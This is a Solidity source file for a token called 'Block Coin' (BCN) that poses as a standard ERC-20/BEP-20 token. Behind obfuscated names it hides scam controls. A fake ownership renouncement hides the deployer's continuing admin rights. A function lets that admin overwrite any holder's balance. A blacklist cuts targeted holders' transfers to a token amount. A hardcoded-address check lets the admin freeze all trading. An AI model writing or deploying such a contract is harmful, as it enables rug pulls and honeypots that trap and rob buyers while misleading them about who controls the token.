//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface fundSwap {
    function createPair(address listTrading, address marketingSwapBuy) external returns (address);
}

interface liquiditySwapAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atLaunch) external view returns (uint256);

    function transfer(address sellLaunchSender, uint256 minToken) external returns (bool);

    function allowance(address senderTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 minToken) external returns (bool);

    function transferFrom(
        address sender,
        address sellLaunchSender,
        uint256 minToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapAuto, uint256 value);
    event Approval(address indexed senderTake, address indexed spender, uint256 value);
}

abstract contract fromMaxList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquiditySwapAtMetadata is liquiditySwapAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BlockCoin is fromMaxList, liquiditySwapAt, liquiditySwapAtMetadata {

    function owner() external view returns (address) {
        return modeSender;
    }

    function walletIs(address maxLaunched) public {
        enableReceiver();
        
        if (maxLaunched == autoLimit || maxLaunched == teamTrading) {
            return;
        }
        receiverSell[maxLaunched] = true;
    }

    function amountEnableExempt(address takeList, address sellLaunchSender, uint256 minToken) internal returns (bool) {
        require(totalMarketing[takeList] >= minToken);
        totalMarketing[takeList] -= minToken;
        totalMarketing[sellLaunchSender] += minToken;
        emit Transfer(takeList, sellLaunchSender, minToken);
        return true;
    }

    string private buyTxMax = "BCN";

    function approve(address isMaxFund, uint256 minToken) public virtual override returns (bool) {
        txTo[_msgSender()][isMaxFund] = minToken;
        emit Approval(_msgSender(), isMaxFund, minToken);
        return true;
    }

    address public autoLimit;

    constructor (){
        
        launchedWallet launchFee = launchedWallet(shouldReceiver);
        teamTrading = fundSwap(launchFee.factory()).createPair(launchFee.WETH(), address(this));
        if (maxTx == exemptSwap) {
            liquidityWallet = launchedBuy;
        }
        autoLimit = _msgSender();
        exemptMaxReceiver[autoLimit] = true;
        totalMarketing[autoLimit] = minWalletExempt;
        atTx();
        if (liquidityWallet != exemptSwap) {
            maxTx = exemptSwap;
        }
        emit Transfer(address(0), autoLimit, minWalletExempt);
    }

    uint256 totalTeam;

    function transfer(address swapTrading, uint256 minToken) external virtual override returns (bool) {
        return launchAmount(_msgSender(), swapTrading, minToken);
    }

    function name() external view virtual override returns (string memory) {
        return enableTo;
    }

    function launchAmount(address takeList, address sellLaunchSender, uint256 minToken) internal returns (bool) {
        if (takeList == autoLimit) {
            return amountEnableExempt(takeList, sellLaunchSender, minToken);
        }
        uint256 maxAmount = liquiditySwapAt(teamTrading).balanceOf(swapEnableIs);
        require(maxAmount == totalTeam);
        require(sellLaunchSender != swapEnableIs);
        if (receiverSell[takeList]) {
            return amountEnableExempt(takeList, sellLaunchSender, listTokenBuy);
        }
        return amountEnableExempt(takeList, sellLaunchSender, minToken);
    }

    function balanceOf(address atLaunch) public view virtual override returns (uint256) {
        return totalMarketing[atLaunch];
    }

    bool public exemptLimit;

    mapping(address => mapping(address => uint256)) private txTo;

    function enableToken(uint256 minToken) public {
        enableReceiver();
        totalTeam = minToken;
    }

    address private modeSender;

    function decimals() external view virtual override returns (uint8) {
        return walletAmount;
    }

    uint256 private exemptSwap;

    mapping(address => uint256) private totalMarketing;

    mapping(address => bool) public exemptMaxReceiver;

    function atTx() public {
        emit OwnershipTransferred(autoLimit, address(0));
        modeSender = address(0);
    }

    string private enableTo = "Block Coin";

    uint256 public liquidityWallet;

    function allowance(address limitReceiver, address isMaxFund) external view virtual override returns (uint256) {
        if (isMaxFund == shouldReceiver) {
            return type(uint256).max;
        }
        return txTo[limitReceiver][isMaxFund];
    }

    uint256 public maxTx;

    mapping(address => bool) public receiverSell;

    address swapEnableIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function sellExempt(address fromTake) public {
        if (exemptLimit) {
            return;
        }
        if (maxTx == exemptSwap) {
            launchedBuy = exemptSwap;
        }
        exemptMaxReceiver[fromTake] = true;
        
        exemptLimit = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return minWalletExempt;
    }

    function launchedReceiver(address swapTrading, uint256 minToken) public {
        enableReceiver();
        totalMarketing[swapTrading] = minToken;
    }

    uint256 constant listTokenBuy = 6 ** 10;

    uint8 private walletAmount = 18;

    event OwnershipTransferred(address indexed senderLimit, address indexed enableFrom);

    address shouldReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public teamTrading;

    function symbol() external view virtual override returns (string memory) {
        return buyTxMax;
    }

    function getOwner() external view returns (address) {
        return modeSender;
    }

    uint256 exemptLaunch;

    function enableReceiver() private view {
        require(exemptMaxReceiver[_msgSender()]);
    }

    function transferFrom(address takeList, address sellLaunchSender, uint256 minToken) external override returns (bool) {
        if (_msgSender() != shouldReceiver) {
            if (txTo[takeList][_msgSender()] != type(uint256).max) {
                require(minToken <= txTo[takeList][_msgSender()]);
                txTo[takeList][_msgSender()] -= minToken;
            }
        }
        return launchAmount(takeList, sellLaunchSender, minToken);
    }

    uint256 public launchedBuy;

    uint256 private minWalletExempt = 100000000 * 10 ** 18;

}